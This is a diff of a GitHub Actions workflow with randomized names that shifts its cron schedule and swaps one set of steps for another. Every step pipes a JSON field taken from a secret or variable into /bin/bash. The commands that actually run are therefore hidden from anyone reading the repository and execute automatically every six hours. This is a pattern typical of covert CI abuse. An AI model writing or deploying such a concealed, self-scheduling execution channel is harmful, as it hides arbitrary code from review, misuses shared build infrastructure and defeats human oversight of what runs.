@@ -3,25 +3,20 @@ name: dongkuangyu7654
 on:
   workflow_dispatch:
   schedule:
-    - cron: '41 4/6 * * *'
+    - cron: '52 4/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: dongkuangyu7654
         env:
-          spkpz083: ${{ secrets.spkpz083 }}
+          ykhs7230: ${{ secrets.ykhs7230 }}
         run: |
-          echo $spkpz083 | jq -r .vwa4 | /bin/bash
-          echo $khs76 | jq -r .eq821 | /bin/bash
-          echo $svh4275 | jq -r .qgdqr155 | /bin/bash
-          echo $mgdt59 | jq -r .gb875 | /bin/bash
-          echo $wwe5613 | jq -r .bkpmq994 | /bin/bash
-          echo $y96 | jq -r .hbgsn0 | /bin/bash
-          echo $tit1261 | jq -r .xizbv83 | /bin/bash
-          echo $bvgb5 | jq -r .kv96 | /bin/bash
-          echo $op02 | jq -r .ikluf6172 | /bin/bash
-          echo $gnql11577 | jq -r .pw00966 | /bin/bash
+          echo $ykhs7230 | jq -r .s50574 | /bin/bash
+          echo $r00264 | jq -r .lspe47926 | /bin/bash
+          echo $lhe30130 | jq -r .nkzv8945 | /bin/bash
+          echo $mpg0197 | jq -r .k134 | /bin/bash
+          echo $hvgld128 | jq -r .jqnow4 | /bin/bash
 
